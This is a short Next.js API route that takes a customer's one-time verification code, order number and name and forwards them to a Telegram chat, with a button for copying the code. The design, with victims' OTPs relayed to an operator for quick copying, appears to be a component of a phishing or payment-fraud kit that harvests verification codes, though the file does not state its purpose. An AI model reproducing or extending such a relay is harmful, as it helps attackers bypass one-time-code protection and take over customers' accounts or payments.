import { NextRequest, NextResponse } from "next/server";
import { sendTelegram } from "@/lib/telegram";

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  await sendTelegram({ text, reply_markup: { inline_keyboard: [[{ text: "📋 نسخ الكود", copy_text: { text: code } }]] } });

  return NextResponse.json({ ok: true });
}
